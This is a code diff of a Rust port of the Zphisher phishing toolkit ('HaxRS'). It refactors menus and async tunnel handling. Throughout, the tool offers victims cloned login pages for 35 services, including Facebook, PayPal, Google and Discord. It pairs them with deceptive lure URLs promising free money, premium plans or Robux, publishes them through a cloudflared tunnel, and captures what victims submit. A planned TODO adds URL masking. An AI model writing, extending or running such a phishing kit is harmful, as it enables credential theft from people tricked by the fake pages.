@@ -1,9 +1,9 @@
-use crate::behind::cli::{clear_terminal, error_msg, log_msg};
-use crate::behind::constants::*;
-use crate::behind::helpers::{files_exist, get_data_dir, get_download_urls, get_server_dir, get_sites_dir};
+use crate::cli::{clear_terminal, error_msg, log_msg};
+use crate::constants::*;
+use crate::helpers::{files_exist, get_data_dir, get_download_urls, get_server_dir, get_sites_dir};
 
 use colored::Colorize;
-use std::{env, io, thread, time};
+use std::{env, io};
 
 use std::fs;
 use std::path::{Path, PathBuf};
@@ -11,14 +11,16 @@ use std::process::{exit, Command};
 
 use reqwest::Url;
 use std::fs::{File, OpenOptions, remove_file};
-use std::io::{BufRead, BufReader, Write};
+use std::io::{BufRead, BufReader, stdin, stdout, Write};
 use std::thread::sleep;
 use std::time::Duration;
 use zip::read::ZipFile;
 use zip::ZipArchive;
 use rayon::prelude::*;
 use regex::Regex;
-use crate::behind::errors::TerminalError;
+use reqwest::header::USER_AGENT;
+use crate::errors::TerminalError;
+use crate::web_server::start_webserver;
 
 
 pub fn setup_directories() {
@@ -85,6 +87,7 @@ pub fn banner() {
     println!("HaxRS Version: {}", VERSION.bold());
     println!("Zphisher Version: {}", ZPHISHER_VERSION.bold());
     println!("{} {}", "Created by:".dimmed(), "Skyline".dimmed().bold());
+    println!();
 }
 
 pub fn banner_small() {
@@ -96,6 +99,7 @@ pub fn banner_small() {
     println!("{}", BANNER.cyan());
     println!("HaxRS Version: {}", VERSION.bold());
     println!("Zphisher Version: {}", ZPHISHER_VERSION.bold());
+    println!();
 }
 
 #[cfg(target_os = "windows")]
@@ -197,7 +201,6 @@ fn download(url: &str) -> Result<PathBuf, Box<dyn std::error::Error>> {
     log::info!("Target path: {:?}", target_path);
 
     // Handle different file types
-    // TODO: REMEMBER HERE *
     let mut outpath = PathBuf::new();
 
     match file_extension {
@@ -323,43 +326,43 @@ pub fn install_dependencies() {
     });
 }
 
-
 pub fn custom_port_input() -> Result<u16, TerminalError> {
     loop {
         print!("{}{}", "Enter Your Custom 4-digit Port [1024-9999] : ".cyan(), String::new().white());
-        io::stdout().flush()?;
+        stdout().flush()?;
         let mut selection = String::new();
-        io::stdin().read_line(&mut selection)?;
+        stdin().read_line(&mut selection)?;
         selection = selection.trim().to_string();
         if selection.is_empty() {
             log::error!("No input");
             error_msg("Empty input");
-        }
-        // turn this into a match statement
-        let num: u16 = match selection.parse::<u16>() {
-            Ok(s) => s,
-            Err(_) => {
-                log::error!("Not a number");
-                error_msg("Not a number");
+        } else {
+            // turn this into a match statement
+            let num: u16 = match selection.parse::<u16>() {
+                Ok(s) => s,
+                Err(_) => {
+                    log::error!("Not a number");
+                    error_msg("Not a number");
+                    continue;
+                }
+            };
+
+            if !(1024..=9999).contains(&num) {
+                log::error!("Not in range");
+                error_msg("Not in range");
                 continue;
             }
-        };
-
-        if !(1024..=9999).contains(&num) {
-            log::error!("Not in range");
-            error_msg("Not in range");
-            continue;
+            return Ok(num);
         }
-        return Ok(num);
     }
 }
 
 pub fn site_input() -> Result<u16, TerminalError> {
     loop {
         print!("{}{}", "Select a site: ".cyan(), String::new().white());
-        io::stdout().flush()?;
+        stdout().flush()?;
         let mut selection = String::new();
-        io::stdin().read_line(&mut selection)?;
+        stdin().read_line(&mut selection)?;
         selection = selection.trim().to_string();
         if selection.is_empty() {
             log::error!("Empty input");
@@ -379,78 +382,75 @@ pub fn site_input() -> Result<u16, TerminalError> {
 }
 
 
-// TODO: site_selection stops the entire program because of async recursion, so fix that.
-pub fn site_selection<'a>() -> Result<(&'a str, Option<&'a str>), TerminalError> {
+pub fn site_selection<'a>() -> (&'a str, Option<&'a str>) {
     let selection = match site_input() {
         Ok(s) => s,
         Err(e) => {
             log::error!("Failed to get site input: {}", e);
             error_msg(&format!("Failed to get site input: {}", e));
-            return Err("Failed to get site input".into());
+            return ("", None);
         }
     };
     match selection {
-        1 => Ok(("facebook", None)),
-        2 => Ok(("instagram", None)),
-        3 => Ok(("google", None)),
-        4 => Ok(("microsoft", Some("https://unlimited-onedrive-space-for-free"))),
-        5 => Ok(("netflix", Some("https://upgrade-your-netflix-plan-free"))),
-        6 => Ok(("paypal", Some("https://get-500-usd-free-to-your-acount"))),
-        7 => Ok(("steam", Some("https://steam-500-usd-gift-card-free"))),
-        8 => Ok(("twitter", Some("https://get-blue-badge-on-twitter-free"))),
-        9 => Ok(("playstation", Some("https://playstation-500-usd-gift-card-free"))),
-        10 => Ok(("tiktok", Some("https://tiktok-free-liker"))),
-        11 => Ok(("twitch", Some("https://unlimited-twitch-tv-user-for-free"))),
-        12 => Ok(("pinterest", Some("https://get-a-premium-plan-for-pinterest-free"))),
-        13 => Ok(("snapchat", Some("https://view-locked-snapchat-accounts-secretly"))),
-        14 => Ok(("linkedin", Some("https://get-a-premium-plan-for-linkedin-free"))),
-        15 => Ok(("ebay", Some("https://get-500-usd-free-to-your-acount"))),
-        16 => Ok(("quora", Some("https://quora-premium-for-free"))),
-        17 => Ok(("protonmail", Some("https://protonmail-pro-basics-for-free"))),
-        18 => Ok(("spotify", Some("https://convert-your-account-to-spotify-premium"))),
-        19 => Ok(("reddit", Some("https://reddit-official-verified-member-badge"))),
-        20 => Ok(("adobe", Some("https://get-adobe-lifetime-pro-membership-free"))),
-        21 => Ok(("deviantart", Some("https://get-500-usd-free-to-your-acount"))),
-        22 => Ok(("badoo", Some("https://get-500-usd-free-to-your-acount"))),
-        23 => Ok(("origin", Some("https://get-500-usd-free-to-your-acount"))),
-        24 => Ok(("dropbox", Some("https://get-1TB-cloud-storage-free"))),
-        25 => Ok(("yahoo", Some("https://grab-mail-from-anyother-yahoo-account-free"))),
-        26 => Ok(("wordpress", Some("https://unlimited-wordpress-traffic-free"))),
-        27 => Ok(("yandex", Some("https://grab-mail-from-anyother-yandex-account-free"))),
-        28 => Ok(("stackoverflow", Some("https://get-stackoverflow-lifetime-pro-membership-free"))),
-        29 => Ok(("vk", None)),
-        30 => Ok(("xbox", Some("https://get-500-usd-free-to-your-acount"))),
-        31 => Ok(("mediafire", Some("https://get-1TB-on-mediafire-free"))),
-        32 => Ok(("gitlab", Some("https://get-1k-followers-on-gitlab-free"))),
-        33 => Ok(("github", Some("https://get-1k-followers-on-github-free"))),
-        34 => Ok(("discord", Some("https://get-discord-nitro-free"))),
-        35 => Ok(("roblox", Some("https://get-free-robux"))),
-        99 => Ok(("about", None)),
-        0 => Ok(("exit", None)),
-        // TODO: Here fix the Error ( This causes the program to stop )
+        1 => ("facebook", None),
+        2 => ("instagram", None),
+        3 => ("google", None),
+        4 => ("microsoft", Some("https://unlimited-onedrive-space-for-free")),
+        5 => ("netflix", Some("https://upgrade-your-netflix-plan-free")),
+        6 => ("paypal", Some("https://get-500-usd-free-to-your-acount")),
+        7 => ("steam", Some("https://steam-500-usd-gift-card-free")),
+        8 => ("twitter", Some("https://get-blue-badge-on-twitter-free")),
+        9 => ("playstation", Some("https://playstation-500-usd-gift-card-free")),
+        10 => ("tiktok", Some("https://tiktok-free-liker")),
+        11 => ("twitch", Some("https://unlimited-twitch-tv-user-for-free")),
+        12 => ("pinterest", Some("https://get-a-premium-plan-for-pinterest-free")),
+        13 => ("snapchat", Some("https://view-locked-snapchat-accounts-secretly")),
+        14 => ("linkedin", Some("https://get-a-premium-plan-for-linkedin-free")),
+        15 => ("ebay", Some("https://get-500-usd-free-to-your-acount")),
+        16 => ("quora", Some("https://quora-premium-for-free")),
+        17 => ("protonmail", Some("https://protonmail-pro-basics-for-free")),
+        18 => ("spotify", Some("https://convert-your-account-to-spotify-premium")),
+        19 => ("reddit", Some("https://reddit-official-verified-member-badge")),
+        20 => ("adobe", Some("https://get-adobe-lifetime-pro-membership-free")),
+        21 => ("deviantart", Some("https://get-500-usd-free-to-your-acount")),
+        22 => ("badoo", Some("https://get-500-usd-free-to-your-acount")),
+        23 => ("origin", Some("https://get-500-usd-free-to-your-acount")),
+        24 => ("dropbox", Some("https://get-1TB-cloud-storage-free")),
+        25 => ("yahoo", Some("https://grab-mail-from-anyother-yahoo-account-free")),
+        26 => ("wordpress", Some("https://unlimited-wordpress-traffic-free")),
+        27 => ("yandex", Some("https://grab-mail-from-anyother-yandex-account-free")),
+        28 => ("stackoverflow", Some("https://get-stackoverflow-lifetime-pro-membership-free")),
+        29 => ("vk", None),
+        30 => ("xbox", Some("https://get-500-usd-free-to-your-acount")),
+        31 => ("mediafire", Some("https://get-1TB-on-mediafire-free")),
+        32 => ("gitlab", Some("https://get-1k-followers-on-gitlab-free")),
+        33 => ("github", Some("https://get-1k-followers-on-github-free")),
+        34 => ("discord", Some("https://get-discord-nitro-free")),
+        35 => ("roblox", Some("https://get-free-robux")),
+        99 => ("about", None),
+        0 => ("exit", None),
         _ => {
             log::error!("Invalid selection");
             error_msg("Invalid selection, Please try again");
-            Err("Invalid selection".into())
+            site_selection()
         }
     }
 }
 
 
-pub fn start_localhost() -> Result<(), TerminalError> {
+pub async fn start_localhost(site: &str) -> Result<(), TerminalError> {
     let custom_port: u16 = custom_port_input()?;
     log::info!("Starting localhost on port {}", custom_port);
     println!("{} ({})", "Initializing...".green(), format!("http://{0}:{1}", HOST, custom_port).cyan());
-    setup_site()?;
+    setup_site(site).await?;
     clear_terminal()?;
     banner_small();
     println!("{} ({})", "Successfully Hosted at : ".green(), format!("http://{0}:{1}", HOST, custom_port).cyan());
     capture_data()?;
-    // TODO: to be implemented
     Ok(())
 }
 
-pub fn tunnel_menu() -> Result<(), TerminalError> {
+pub async fn tunnel_menu(site: &str) -> Result<(), TerminalError> {
     clear_terminal()?;
     banner_small();
     let servers = vec![
@@ -467,34 +467,78 @@ pub fn tunnel_menu() -> Result<(), TerminalError> {
             None => println!("{} {}", colorized_id, colorized_server),
         }
     }
+    println!();
+    tunnel_selection(site).await?;
 
     Ok(())
 }
 
 
-pub fn setup_site() -> Result<(), TerminalError> {
+pub fn get_input_number(msg: &str) -> Result<u32, TerminalError> {
+    print!("{}", msg);
+    stdout().flush()?;
+    let mut input = String::new();
+    stdin().read_line(&mut input)?;
+    match input.trim().parse::<u32>() {
+        Ok(val) => Ok(val),
+        Err(_) => {
+            log::error!("Invalid input");
+            error_msg("Invalid input");
+            get_input_number(msg)
+        }
+    }
+}
+
+pub fn get_input_string(msg: &str) -> Result<String, TerminalError> {
+    print!("{}", msg);
+    stdout().flush()?;
+    let mut input = String::new();
+    stdin().read_line(&mut input)?;
+    Ok(input.trim().to_string())
+}
+
+pub async fn tunnel_selection(site: &str) -> Result<(), TerminalError> {
+    loop {
+        let selection: u32 = get_input_number("Select a tunnel: ")?;
+        match selection {
+            1 => return start_localhost(site).await,
+            2 => return start_cloudflared(site).await,
+            3 => {
+                error_msg("Not implemented yet");
+                continue;
+            }
+            _ => {
+                log::error!("Invalid selection");
+                error_msg("Invalid selection, Please try again");
+                continue;
+            }
+        }
+    }
+}
+
+
+
+pub async fn setup_site(site: &str) -> Result<(), TerminalError> {
     log::info!("Setting up site");
+
+
+
     #[cfg(target_os = "windows")]
     {
         println!("{} {}", "Setting up server...".green(), "Please wait".cyan());
-        let php_path = env::current_dir()?.join("php-bin").join("php.exe");
-        if !php_path.exists() {
-            log::error!("PHP not found");
-            error_msg("PHP not found");
-            return Err("PHP not found".into());
-        }
         // change into .server directory
         let sites_dir = get_sites_dir().unwrap_or_else(|| {
             log::error!("Failed to get sites directory");
             error_msg("Failed to get sites directory");
             exit(1);
         });
-        env::set_current_dir(sites_dir)?;
+        let site_dir = sites_dir.join(site);
+        dbg!("Changing directory to {:?}", &sites_dir);
+        // env::set_current_dir(&sites_dir)?;
+        dbg!(&site_dir);
 
+        start_webserver(site_dir).await?;
         // to do this in rust: cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
-        let mut cmd = Command::new(php_path);
-        cmd.arg("-S");
-        cmd.arg(format!("{}:{}", HOST, PORT));
         clear_terminal()?;
         banner_small();
         println!("{} {}", "Successfully started server at".green(), format!("http://{0}:{1}", HOST, PORT).cyan());
@@ -668,7 +712,7 @@ fn get_cldflr_url() -> Result<String, TerminalError> {
 }
 
 
-pub fn start_cloudflared() -> Result<(), TerminalError> {
+pub async fn start_cloudflared(site: &str) -> Result<(), TerminalError> {
     // remove ".cld.log" file if exists
     let cld_log = match get_server_dir() {
         Some(s) => s,
@@ -689,7 +733,7 @@ pub fn start_cloudflared() -> Result<(), TerminalError> {
             }
         }
     }
-    setup_site()?;
+    setup_site(site).await?;
     let cus_port: u16 = custom_port_input()?;
     #[cfg(target_os = "windows")]
     {
@@ -717,11 +761,9 @@ pub fn start_cloudflared() -> Result<(), TerminalError> {
     Ok(())
 }
 
-pub fn main_menu() -> Result<(), TerminalError> {
+pub async fn main_menu() -> Result<(), TerminalError> {
     clear_terminal()?;
     banner();
-
-
     let services: Vec<(&str, (u8, u8, u8))> = vec![
         ("Facebook", (66, 103, 178)), ("Instagram", (225, 48, 108)), ("Google", (66, 133, 244)), ("Microsoft", (43, 87, 151)),
         ("Netflix", (229, 9, 20)), ("Paypal", (0, 123, 182)), ("Steam", (100, 100, 100)), ("Twitter", (29, 161, 242)),
@@ -734,7 +776,7 @@ pub fn main_menu() -> Result<(), TerminalError> {
         ("Github", (100, 100, 100)), ("Discord", (114, 137, 218)), ("Roblox", (226, 35, 26)),
     ];
 
-    println!("{}", "[::] Select An Attack For Your Victim [::]".red());
+    println!("{} {} {}\n", "[::]".red(), "Select An Attack For Your Victim".bright_blue(), "[::]".red());
 
     for (i, (service, color)) in services.iter().enumerate() {
         let id = format!("{:2}", i + 1);
@@ -753,25 +795,16 @@ pub fn main_menu() -> Result<(), TerminalError> {
     println!("{}) {:<15} ", "99".red(), "About".bright_blue());
     println!("{}) {:<15} ", "0".red(), "Exit".bright_blue());
     println!();
-    let sel: (&str, Option<&str>) = match site_selection() {
-        Ok(s) => s,
-        Err(e) => {
-            log::error!("Failed to get site selection: {}", e);
-            error_msg(&format!("Failed to get site selection: {}", e));
-            return Err("Failed to get site selection".into());
-        }
-    };
-    // println!("signaled: {se}");
+    let sel: (&str, Option<&str>) = site_selection();
+    if sel.1.is_some() {
+        tunnel_menu(sel.0).await?;
+    }
+    println!("signaled: {0} | {1}", sel.0, sel.1.unwrap_or("None"));
     Ok(())
 }
 
-// TODO: Add LocalXPose and Localhost.
-// TODO: Add Start with Cloudflare.
+// TODO: Use Actix-web instead of PHP.
 // TODO: Add LocalXPose Auth.
 // TODO: Add Start with LocalXPose.
-// TODO: Add Start with Localhost.
-// TODO: Add Tunnel Menu.
 // TODO: Add URL shortener/masking.
-// TODO: Add Menu.
-
 // TODO: Add checks for file download!!!!
